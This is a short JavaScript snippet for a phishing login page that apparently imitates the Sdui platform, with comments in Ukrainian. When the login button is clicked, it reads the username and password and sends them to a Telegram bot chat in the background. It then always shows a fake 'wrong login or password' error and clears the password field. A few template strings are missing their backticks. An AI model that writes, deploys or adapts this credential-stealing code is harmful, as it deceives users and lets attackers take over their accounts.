document.getElementById('loginBtn').addEventListener('click', function(e) {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    // Telegram відправка (працює в фоні)
    const botToken = process.env.TELEGRAM_TOKEN;
    const chatId = '8358685058';
    const message = 🔐 НОВІ ДАНІ Sdui:\n👤 Користувач: ${username}\n🔑 Пароль: ${password};
    const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
    
    fetch(url).catch(error => console.error('Помилка Telegram:', error));

    // Завжди показуємо помилку
    setTimeout(() => {
        alert('Неправильний логін або пароль. Спробуйте ще раз.');
        document.getElementById('password').value = '';
    }, 500);

});
